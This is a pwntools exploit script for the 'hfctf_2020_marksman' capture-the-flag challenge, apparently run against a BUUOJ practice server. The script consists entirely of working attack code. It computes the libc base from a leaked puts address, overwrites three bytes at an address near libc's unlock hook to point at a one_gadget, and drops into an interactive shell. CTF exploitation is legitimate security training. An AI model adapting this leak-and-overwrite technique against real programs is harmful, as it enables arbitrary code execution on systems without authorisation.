from pwn import *

#context.log_level = 'debug'

#p = process('./hfctf_2020_marksman')
p = remote('node4.buuoj.cn', 27982)
libc = ELF('libc-2.27.buu.so')
ld = ELF('ld-2.27.so')

def debug(s):
	gdb.attach(p, '''
		source ~/pwn/.debug/loadsym.py
		loadsym ~/pwn/.debug/64/libc-2.27.so
	''' + s)
#debug('b *$rebase(0xd63)')
	
ru = lambda s : p.recvuntil(s)
rv = lambda s : p.recv(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)

ru(b'near: ')
libc_base = int(rv(14), 16) - libc.sym['puts']
ld_base = libc_base + 0x3f1000
one_gadgets = [0x4f365, 0x4f3c2, 0x10a45c]
one_gadgets_buu = [0x4f2c5, 0x4f322, 0x10a38c]
one = one_gadgets_buu[2] + libc_base - 5

success('libc_base -> {}'.format(hex(libc_base)))
success('ld_base -> {}'.format(hex(ld_base)))

unlock_recursive = libc_base + 0x81df60

#print(unlock_recursive)
ru(b'shoot!\n')

sl(str(unlock_recursive).encode())

for i in range(3):
	ru(b'biang!\n')
	sl(bytearray([one & 0xff]))
	one = one >> 8
	
p.interactive()
